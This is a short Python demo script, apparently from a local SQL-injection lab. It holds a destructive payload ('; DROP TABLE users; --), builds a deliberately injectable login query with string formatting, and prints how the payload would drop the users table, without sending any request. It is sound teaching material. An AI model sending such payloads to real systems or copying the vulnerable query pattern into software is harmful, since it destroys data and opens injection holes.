LOGIN_URL = "http://127.0.0.1:5000/vulnerable/login"
USERNAME_PAYLOAD = "'; DROP TABLE users; --"
PASSWORD = "anything"


def build_vulnerable_query(username: str, password: str) -> str:
    return (
        "SELECT id, username, role, is_active FROM users "
        f"WHERE username = '{username}' AND password = '{password}'"
    )


def main() -> None:
    query = build_vulnerable_query(USERNAME_PAYLOAD, PASSWORD)

    print(f"Target login route: {LOGIN_URL}")
    print(f"Username payload: {USERNAME_PAYLOAD!r}")
    print()
    print("[DEMO SAFETY] No request is sent in this script.")
    print("Reason: this payload is destructive and could drop the users table.")
    print()
    print("Query that the vulnerable app would build:")
    print(query)
    print()
    print("What this would do if stacked queries were allowed:")
    print("1. Close the original username string with ''.")
    print("2. Execute DROP TABLE users;")
    print("3. Comment out the trailing password condition with --")


if __name__ == "__main__":
    main()
